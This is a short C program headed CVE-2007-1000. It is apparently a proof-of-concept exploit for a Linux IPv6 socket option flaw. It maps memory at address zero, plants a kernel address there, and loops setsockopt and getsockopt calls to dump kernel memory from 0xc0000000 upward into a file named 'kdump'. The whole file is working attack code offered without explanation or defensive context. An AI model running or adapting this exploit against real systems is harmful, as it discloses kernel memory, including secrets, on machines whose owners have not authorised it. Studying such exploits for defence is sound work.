/* CVE-2007-1000 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <assert.h>
#include <sys/mman.h>
#include <unistd.h>

#define PTR_OFFSET 8

static int fd;
static unsigned long kaddr = 0xc0000000;
static char *map;

void setup_userland(unsigned long addr, uint8_t len)
{
   *((unsigned long*)&map[PTR_OFFSET]) = addr;
}

void start_dump()
{
   int sock;
   int ret;
   int len;
   char *userbuf;

   sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
   assert(sock != -1);

   map = mmap(NULL, 4096, 
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
                     0, 0);
   assert(map == NULL);

   len = 4096;
   userbuf = calloc(1, len);
   assert(userbuf != NULL);

   while(kaddr < 0xFFFFFFFF) {
      printf("[+] Attempting to read kmem from %p\n", kaddr);

      setup_userland(kaddr, 100);
      len = 4096;
      ret = setsockopt(sock, IPPROTO_IPV6, 6, NULL, 0);
      assert(ret != -1);
      ret = getsockopt(sock, IPPROTO_IPV6, 59, userbuf, &len);
      assert(ret != -1);

      write(fd, userbuf, len);
      
      if(!len)
         len = 1;

      kaddr += (unsigned long) len;
      usleep(100);
   }
   close(fd);
}

int main(int argc, char **argv)
{
   fd = open("kdump", O_CREAT | O_RDWR | O_SYNC, 0600);
   start_dump();
}
